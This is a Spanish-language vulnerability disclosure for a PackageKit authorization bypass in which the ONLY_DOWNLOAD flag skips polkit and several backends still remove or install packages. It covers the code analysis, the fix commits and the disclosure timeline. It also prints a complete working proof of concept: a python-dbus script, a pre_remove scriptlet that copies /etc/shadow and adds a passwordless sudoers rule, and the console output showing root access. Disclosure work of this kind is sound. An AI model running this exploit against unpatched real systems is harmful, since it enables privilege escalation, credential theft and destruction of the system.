# CVE-2026-55752: El flag ONLY_DOWNLOAD de PackageKit skipea polkit, y cuatro backends instalan y remueven igual

**Publicado:** 2026-09-14 **Reportado:** 2026-05-21 **Severidad:** 8.8 Alta **Estado:** Corregido en PackageKit 1.4.0 (GHSA-x282-cq95-f96w) **CWE:** CWE-862 (Missing Authorization)

---

El daemon de PackageKit se saltea el check de autorización de polkit por completo cuando una transacción lleva el flag `ONLY_DOWNLOAD`. Eso es deliberado: descargar paquetes no modifica el sistema, así que no necesita prompt de autenticación. La seguridad de ese atajo descansa sobre un contrato: todo backend tiene que honrar `ONLY_DOWNLOAD` y negarse a instalar o remover. Cuatro handlers de backend nunca leen el flag. Un usuario local sin privilegios abre una transacción D-Bus, setea `transaction_flags = 8`, llama a `RemovePackages`, y packagekitd remueve el paquete como root sin prompt, ejecutando de paso el scriptlet `pre_remove` del paquete como root. Asignado CVE-2026-55752, rateado Alto (CVSS 8.8), corregido en PackageKit 1.4.0.

---

## Contexto: el contrato, y el fix anterior que no lo arregló

En febrero de 2026, GHSA-wpcw-g86j-489v reportó exactamente esta forma contra el backend de Slackware: `ONLY_DOWNLOAD` skipea polkit en el core, el backend slack ignoraba el flag, callers sin privilegios conseguían install y remove como root.

El fix que salió en 1.3.5, commit `8c629aab9`, borró el directorio `backends/slack/` entero.

Eso elimina un caller de un contrato roto. No arregla el contrato, y no toca el short-circuit del core que hace que el contrato sea load-bearing en primer lugar. El fix de Pack2TheRoot de abril (CVE-2026-41651, commit `76cfb675f`) agregó un check `state == NEW` en el dispatcher de métodos, que cierra un TOCTOU sobre `cached_transaction_flags` pero también deja el bypass de polkit por `ONLY_DOWNLOAD` intacto.

O sea, la pregunta obvia: ¿cuáles de los backends *restantes* rompen el mismo contrato? Audité el árbol de backends en `main` HEAD `9372117` (2026-05-18). Cuatro paths hermanos lo rompen.

## El short-circuit del core

`src/pk-transaction.c`, en `pk_transaction_obtain_authorization`:

```c
/* we don't need to authenticate at all to just download
 * packages or if we're running unit tests */
if (pk_bitfield_contain (transaction->cached_transaction_flags,
             PK_TRANSACTION_FLAG_ENUM_ONLY_DOWNLOAD) ||
        pk_bitfield_contain (transaction->cached_transaction_flags,
             PK_TRANSACTION_FLAG_ENUM_SIMULATE) ||
        transaction->skip_auth_check == TRUE) {
    g_debug ("No authentication required");
    pk_transaction_set_state (transaction, PK_TRANSACTION_STATE_READY);
    return TRUE;
}
```

El flag lo controla el atacante. Llega como primer argumento de todo método D-Bus que cambia estado, y el caller es cualquier uid local con conexión al system bus. Fijate en lo que el check *no* consulta: el role de la transacción. `REMOVE_PACKAGES` con `ONLY_DOWNLOAD` seteado es un sinsentido, porque no hay nada que descargar cuando estás desinstalando, y el core lo deja pasar igual.

## El variant hunt

Por backend, en el commit `9372117`, ¿el handler branchea sobre `ONLY_DOWNLOAD` antes de commitear?

| Backend | `install_packages` | `install_files` | `remove_packages` |
|---------|--------------------|-----------------|-------------------|
| dnf     | honra | honra | honra |
| dnf5    | honra | honra | honra |
| zypp    | honra (commit policy `DownloadOnly`) | n/a | honra |
| poldek  | honra | n/a | n/a |
| alpm    | honra (`ALPM_TRANS_FLAG_DOWNLOADONLY` en `pk-alpm-sync.c`) | **ignora** | **ignora** |
| freebsd | honra (`PKG_FLAG_SKIP_INSTALL`) | n/a | **ignora** |
| portage | honra (pasa `only_download`) | n/a | **ignora** |

Tres de los cuatro handlers vulnerables están justo al lado de un handler hermano, en el mismo backend, que lo hace bien. El `install_packages` de alpm setea `ALPM_TRANS_FLAG_DOWNLOADONLY`, y `install_files` y `remove_packages` no. El `install_packages` de freebsd pasa `PKG_FLAG_SKIP_INSTALL`, y el `remove_packages` no. portage lee `_is_only_download` en `_install_packages` y nunca lo consulta en `_remove_packages`.

No es que el flag se haya olvidado del todo. Se salteó en los paths donde "download-only" se lee como algo sin sentido, y esos son los mismos paths que el short-circuit del core sigue cubriendo.

## Los cuatro handlers

**alpm `remove_packages`**, en `backends/alpm/pk-alpm-remove.c`. Este es el path principal, y el del PoC de abajo:

```c
static void
pk_backend_remove_packages_thread (PkBackendJob *job, GVariant* params, gpointer p)
{
    alpm_transflag_t flags = 0;
    ...
    g_variant_get (params, "(t^a&sbb)",
            &transaction_flags, &package_ids, &allow_deps, &autoremove);
    ...
    if (pk_alpm_transaction_initialize (job, flags, NULL, &error) &&
        pk_alpm_transaction_remove_targets (job, package_ids, &error) &&
        pk_alpm_transaction_remove_simulate (job, &error)) {
        if (pk_bitfield_contain (transaction_flags, PK_TRANSACTION_FLAG_ENUM_SIMULATE)) {
            pk_alpm_transaction_packages (job);
        } else {
            pk_alpm_transaction_commit (job, &error);    /* remove real */
        }
    }
}
```

`transaction_flags` se lee del wire y se testea por exactamente un bit. `ONLY_DOWNLOAD` cae al `else` y llega a `pk_alpm_transaction_commit`, que hace la desinstalación y corre los scriptlets `pre_remove` y `post_remove` del paquete como root.

**alpm `install_files`**, en `backends/alpm/pk-alpm-install.c`. Chequea solo `SIMULATE` y `ONLY_TRUSTED`, y pasa un `0` hardcodeado como transaction flags de alpm, así que `ALPM_TRANS_FLAG_DOWNLOADONLY` tampoco llega nunca a libalpm. En un host con el `SigLevel` relajado, esto es RCE como root vía el scriptlet `post_install` de un `.INSTALL` escrito por el atacante. Cambia de scope, CVSS 8.8.

**freebsd `remove_packages`**, en `backends/freebsd/pk-backend-freebsd.cpp`. Chequea solo `SIMULATE`. `jobs.apply()` corre el deinstall de libpkg, que ejecuta `+PRE_DEINSTALL` como root.

**portage `_remove_packages`**, en `backends/portage/portageBackend.py`. Chequea solo `_is_simulate`. El unmerge corre `pkg_prerm` como root.

## PoC

`archlinux:latest` por defecto, `pacman.conf` de fábrica, PackageKit de fábrica, sin relajar `SigLevel`. La cadena completa abajo, sin recortar nada.

### Setup: el host objetivo

Todo lo de esta sección es administración root normal de la máquina. Es el entorno, no el ataque:

```bash
docker run -d --name pkkit-test --hostname arch-pkkit archlinux:latest sleep infinity

docker exec pkkit-test bash -c '
pacman -Syu --noconfirm
pacman -S --noconfirm packagekit dbus polkit base-devel sudo python-dbus shared-mime-info
update-mime-database /usr/share/mime
useradd -m -s /bin/bash attacker
mkdir -p /run/dbus /etc/sudoers.d
dbus-daemon --system --fork
sleep 1
G_MESSAGES_DEBUG=all nohup /usr/lib/packagekitd --verbose > /tmp/pkd.log 2>&1 &
sleep 2
chmod 644 /tmp/pkd.log
'
```

`test-target` es el paquete que se va a remover. Su scriptlet `pre_remove` es el payload. Tres cosas, todas requieren root:

```bash
# /tmp/target_pkg/test-target.install
pre_remove() {
    echo "REMOVE scriptlet ran. uid=$(id -u) euid=$(id -un) at $(date)" > /tmp/PKKIT_REMOVE_PROOF
    chmod 644 /tmp/PKKIT_REMOVE_PROOF
    cp /etc/shadow /tmp/PKKIT_REMOVE_SHADOW 2>/dev/null
    chmod 644 /tmp/PKKIT_REMOVE_SHADOW
    echo "attacker ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/pwn
    chmod 0440 /etc/sudoers.d/pwn
}
```

```bash
# /tmp/target_pkg/PKGBUILD
pkgname=test-target
pkgver=1
pkgrel=1
pkgdesc="Target package for the PoC"
arch=(any)
license=(custom)
install=test-target.install
package() {
    install -dm755 "$pkgdir/opt/target"
    echo "this package exists to be removed by the PoC" > "$pkgdir/opt/target/marker"
}
```

Buildeado e instalado por root, como llega cualquier paquete al sistema:

```bash
docker exec pkkit-test bash -c '
cd /tmp/target_pkg
chown -R attacker:attacker .
runuser -u attacker -- env PKGEXT=.pkg.tar.xz makepkg --noconfirm --skipinteg
pacman -U --noconfirm test-target-1-1-any.pkg.tar.xz
'
```

Scriptlets de removal así no son nada exótico. Toda distro shippea paquetes cuyo `pre_remove` toca estado privilegiado, y de eso vive el path (b) de la sección de impacto. Escribir uno acá es solo para que la prueba se lea clara.

### El exploit

25 líneas de `python-dbus`, dropeadas en `/tmp/exploit_remove.py`, world-readable, sin setuid, sin helper:

```python
#!/usr/bin/env python3
import dbus
bus = dbus.SystemBus()

pk = bus.get_object("org.freedesktop.PackageKit", "/org/freedesktop/PackageKit")
pk_iface = dbus.Interface(pk, "org.freedesktop.PackageKit")
tid = pk_iface.CreateTransaction()
print("Transaction:", tid)

tx = bus.get_object("org.freedesktop.PackageKit", tid)
tx_iface = dbus.Interface(tx, "org.freedesktop.PackageKit.Transaction")

# RemovePackages(transaction_flags, package_ids, allow_deps, autoremove)
# flags=8 = PK_TRANSACTION_FLAG_ENUM_ONLY_DOWNLOAD
flags = dbus.UInt64(8)
pkg_ids = dbus.Array(["test-target;1-1;any;installed"], signature="s")
print("Calling RemovePackages(flags=8, [test-target...], allow_deps=False, autoremove=False)")
try:
    tx_iface.RemovePackages(flags, pkg_ids, False, False)
    print("RemovePackages returned normally")
except dbus.DBusException as e:
    print("RemovePackages raised:", e.get_dbus_message())
```

No hay race ni segunda etapa. Una llamada a un método, un bit seteado.

### La cadena, como el usuario sin privilegios

```console
$ docker exec -it --user attacker pkkit-test bash

attacker@arch-pkkit:~$ id
uid=1000(attacker) gid=1000(attacker) groups=1000(attacker)

attacker@arch-pkkit:~$ grep ^SigLevel /etc/pacman.conf
SigLevel    = Required DatabaseOptional

attacker@arch-pkkit:~$ sudo -n id
sudo: a password is required

attacker@arch-pkkit:~$ pgrep -a polkit-agent || echo 'no polkit auth agent running'
no polkit auth agent running

attacker@arch-pkkit:~$ ls -la /etc/sudoers.d/
ls: cannot open directory '/etc/sudoers.d/': Permission denied

attacker@arch-pkkit:~$ pacman -Q test-target
test-target 1-1

attacker@arch-pkkit:~$ ls -la /tmp/PKKIT_REMOVE_*
ls: cannot access '/tmp/PKKIT_REMOVE_*': No such file or directory
```

uid 1000, sin sudo, sin polkit agent registrado, sin acceso de lectura a `/etc/sudoers.d/`, paquete objetivo instalado, todavía sin output del payload. Ahora la única llamada:

```console
attacker@arch-pkkit:~$ python3 /tmp/exploit_remove.py
Transaction: /1_beedaace
Calling RemovePackages(flags=8, [test-target...], allow_deps=False, autoremove=False)
RemovePackages returned normally
```

```console
attacker@arch-pkkit:~$ pacman -Q test-target
error: package 'test-target' was not found

attacker@arch-pkkit:~$ cat /tmp/PKKIT_REMOVE_PROOF
REMOVE scriptlet ran. uid=0 euid=root at Thu May 21 05:53:43 UTC 2026
```

El paquete no está y el scriptlet corrió como root. Los dos archivos dropeados quedan `root:root`. `/etc/shadow` es modo 600 `root:root` e ilegible para uid 1000. La copia existe solo porque la hizo el scriptlet:

```console
attacker@arch-pkkit:~$ head -5 /tmp/PKKIT_REMOVE_SHADOW
root:*:14871::::::
alpm:[REDACTED HASH]:20590:::::1:
bin:[REDACTED HASH]:20590:::::1:
daemon:[REDACTED HASH]:20590:::::1:
mail:[REDACTED HASH]:20590:::::1:
```

(Los campos de hash van enmascarados acá; los bytes reales del container están en la evidencia del advisory.)

Y la escalada de privilegios cierra:

```console
attacker@arch-pkkit:~$ sudo -n id
uid=0(root) gid=0(root) groups=0(root)

attacker@arch-pkkit:~$ sudo -n cat /etc/sudoers.d/pwn
attacker ALL=(ALL) NOPASSWD: ALL
```

Misma shell, mismo usuario `attacker` por debajo, ahora root. El `sudo -n id` que falló ocho comandos atrás ahora funciona porque el scriptlet `pre_remove` escribió ese drop-in de sudoers como root.

### El bypass en el wire

```console
attacker@arch-pkkit:~$ grep -E 'method called|No authentication required|transaction now|setting role|emit package' /tmp/pkd.log | tail
05:53:43	PackageKit	transaction now new
05:53:43	PackageKit	RemovePackages method called: test-target;1-1;any;installed, 0, 0 (transaction_flags: only-download)
05:53:43	PackageKit	No authentication required
05:53:43	PackageKit	transaction now ready
05:53:43	PackageKit	transaction now running
05:53:43	PackageKit	setting role for /1_beedaace to remove-packages
05:53:43	PackageKit	emit package removing, test-target;1-1;any;installed, Target package the attacker will remove via the polkit bypass
05:53:43	PackageKit	emit package finished, test-target;1-1;any;installed, Target package the attacker will remove via the polkit bypass
05:53:43	PackageKit	transaction now finished
```

`No authentication required`, sobre un role `remove-packages`, desde uid 1000.

## Impacto

La precondición es una conexión al system bus. Todo usuario local interactivo tiene una. Sin `wheel`, sin grupo `sudo`, sin acceso de filesystem a nada privilegiado, sin acceso físico. `PR:L` en términos de CVSS. Desde ahí se abren tres paths distintos, y no todos requieren el mismo setup:

**a) Denial of service, sin nada previo.** `RemovePackages(flags=8, ["linux"])`, o `systemd`, o `glibc`, o `openssh`. El paquete se remueve como root. El host no vuelve de un reboot. Ningún paquete escrito por el atacante, ningún admin involucrado en ningún paso.

**b) Ejecución de código como root vía el scriptlet de otro.** `RemovePackages(flags=8, [<cualquier paquete instalado con un pre_remove no trivial>])`. Los scriptlets de removal los escriben los maintainers de upstream, no el atacante. El atacante solo necesita encontrar uno que ya esté en la máquina y que haga algo útil como root: que toque `/etc/sudoers.d/`, escriba un unit file, reinicie un servicio, dropee un binario SUID, dispare un hook de pacman. Tampoco requiere install previo del atacante.

**c) Ejecución de código como root vía el paquete propio del atacante.** El path del PoC de arriba, y el que mapea a `install_files` en hosts con `SigLevel` relajado. Este es el único path que necesita que un paquete escrito por el atacante ya esté en el sistema.

Durante el triage un maintainer objetó que instalar un paquete malicioso ya requiere autorización, así que la severidad debería bajar. La objeción es válida, pero cubre solo el path (c). Los paths (a) y (b) no requieren autorización previa en ningún paso, y el precedente estructural (GHSA-wpcw-g86j-489v, misma clase de bug, mismo framing de "local auth bypass → DoS / root code execution") fue aceptado como Alto.

**CVSS 3.1:** 8.8 Alta, `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`, acreditado al path de `install_files` donde aplica el cambio de scope. Los tres paths de `remove_packages` dan 7.8 (`S:U`) en configuración por defecto.

Afectados: PackageKit `>= 1.0.2` hasta 1.3.x, en cualquier sistema que use el backend alpm, freebsd o portage: Arch, Manjaro, EndeavourOS, KaOS, FreeBSD, Gentoo. PackageKit no se suele instalar a propósito. Llega como dependencia de GNOME Software y KDE Discover.

## Fix

Dos capas, y las dos entraron.

**Por backend** (commit `62c0620b7`): los cuatro handlers ahora toman la misma rama de report-only que ya tomaban para `SIMULATE`. Cuatro archivos, +12/−6:

```c
-		if (pk_bitfield_contain (transaction_flags, PK_TRANSACTION_FLAG_ENUM_SIMULATE)) { /* simulation */
+		if (pk_bitfield_contain (transaction_flags, PK_TRANSACTION_FLAG_ENUM_SIMULATE) ||
+		    pk_bitfield_contain (transaction_flags, PK_TRANSACTION_FLAG_ENUM_ONLY_DOWNLOAD)) { /* simulate or download-only (no-op for remove) */
 			pk_alpm_transaction_packages (job);
 		}
 		else {
```

Para los tres handlers de remove ese es el fix completo. Una remoción no tiene nada que descargar, así que download-only es un no-op y report-only es el comportamiento semánticamente correcto.

`install_files` necesitó una segunda pasada. Ximion señaló en el review que la rama report-only se comía calladita la mitad *download* de la semántica: un paquete local puede tener dependencias faltantes, y `ONLY_DOWNLOAD` se supone que las baja. El commit `9705bda82` lo arregla como ya lo hacía `pk-alpm-sync.c`, pasándole el flag a libalpm en vez de branchear alrededor:

```c
	if (pk_bitfield_contain (flags, PK_TRANSACTION_FLAG_ENUM_ONLY_DOWNLOAD))
		alpm_flags |= ALPM_TRANS_FLAG_DOWNLOADONLY;
```

Las dependencias caen en el cache, el paquete local nunca se extrae, ningún scriptlet corre. Verificado contra un daemon buildeado desde esa rama: un paquete malicioso que depende de un `cowsay` no instalado, invocado con `InstallFiles(flags=8, ...)`, descarga `cowsay` y no instala nada.

**En el core** (commit `b6fa73b3a`, salió en 1.3.6): `ONLY_DOWNLOAD` ahora está whitelisteado por transaction role en vez de aceptado a ciegas. `REMOVE_PACKAGES` no está en `pk_transaction_role_supports_only_download`, así que la combinación sin sentido que arrancó todo esto se rechaza antes de que un backend la vea. Esta es la capa de defense-in-depth que atrapa al próximo backend que se olvide del flag.

Corregido en PackageKit 1.4.0.

## Disclosure

| Fecha        | Evento                                                          |
|--------------|-----------------------------------------------------------------|
| 2026-05-18   | Arranca la auditoría contra `main` HEAD `9372117`               |
| 2026-05-21   | PoC en vivo sobre Arch de fábrica, reportado vía GitHub Security Advisory |
| 2026-05-21   | Mergeado el patch de backends (`62c0620b7`)                     |
| 2026-06-16   | Mergeado el whitelist de roles del core (`b6fa73b3a`), sale en 1.3.6 |
| 2026-06-17   | Asignado CVE-2026-55752                                         |
| 2026-06-17   | Mergeado el follow-up de semántica de download en `install_files` (`9705bda82`) |
| 2026-09-09   | Publicado GHSA-x282-cq95-f96w, los fixes salen en 1.4.0         |

Co-reportado con Leyner Garzon (crossmarkx). Gracias a Richard Hughes, Matthias Klumpp y Gleb Popov por el triage, por el review que atrapó la regresión de `install_files`, y por el fix a nivel core.

## Conclusión

Ninguna función acá está mal por sí sola. `pk_alpm_transaction_commit` hace lo que dice su nombre, y el short-circuit de polkit hace lo que dice su comentario. El bug vive entre los dos. El core relaja la autorización porque confía en que los backends honren el flag, y nada en el árbol chequea que lo hagan.

GHSA-wpcw-g86j-489v encontró un backend rompiendo esa confianza, y el fix borró el backend. El invariante en sí nunca se hizo cumplir, así que los callers que quedaban seguían valiendo la pena. Cuatro de ellos estaban rotos.

## Links

- Advisory: https://github.com/PackageKit/PackageKit/security/advisories/GHSA-x282-cq95-f96w
- Registro CVE: https://www.cve.org/CVERecord?id=CVE-2026-55752
- Fix de backends: https://github.com/PackageKit/PackageKit/commit/62c0620b70feb366a9fc21a5744917e56942a569
- Semántica de download en `install_files`: https://github.com/PackageKit/PackageKit/commit/9705bda82b955cbc849dd53e1a4d0121d5b0b109
- Whitelist de roles del core: https://github.com/PackageKit/PackageKit/commit/b6fa73b3af5845d5071140433bd136b057bcbebc
- Advisory padre (backend slack): https://github.com/PackageKit/PackageKit/security/advisories/GHSA-wpcw-g86j-489v
- Pack2TheRoot (CVE-2026-41651): https://github.com/PackageKit/PackageKit/security/advisories/GHSA-f55j-vvr9-69xv
- CWE-862: https://cwe.mitre.org/data/definitions/862.html
